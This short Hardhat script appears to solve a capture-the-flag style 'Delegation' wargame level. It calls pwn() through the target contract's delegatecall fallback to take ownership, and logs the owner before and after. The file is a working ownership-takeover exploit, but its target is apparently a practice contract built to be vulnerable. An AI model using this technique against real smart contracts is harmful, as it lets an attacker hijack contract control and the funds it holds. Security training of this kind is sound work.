const hre = require("hardhat");
const abi = require("../artifacts/contracts/DelegationHack.sol/IDelegate.json");

async function main() {


    const [deployer] = await hre.ethers.getSigners();
    console.log("deployer address:", deployer.address)

    const delegationAddress = "0xF06D9db52d07630DB98D02976f49d32a088Afe0e"
    const contractABI = abi.abi;
    const delegationContract = new hre.ethers.Contract(delegationAddress, contractABI, deployer);

    const Owner = await delegationContract.owner();
    console.log("Owner of Delegation contract:", Owner);

    const result = await delegationContract.pwn({gasLimit: ethers.toBeHex(500000)});
    await result.wait();
    console.log("result", result);

    const newOwner = await delegationContract.owner();
    console.log("New owner of Delegation contract:", newOwner);
  }

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });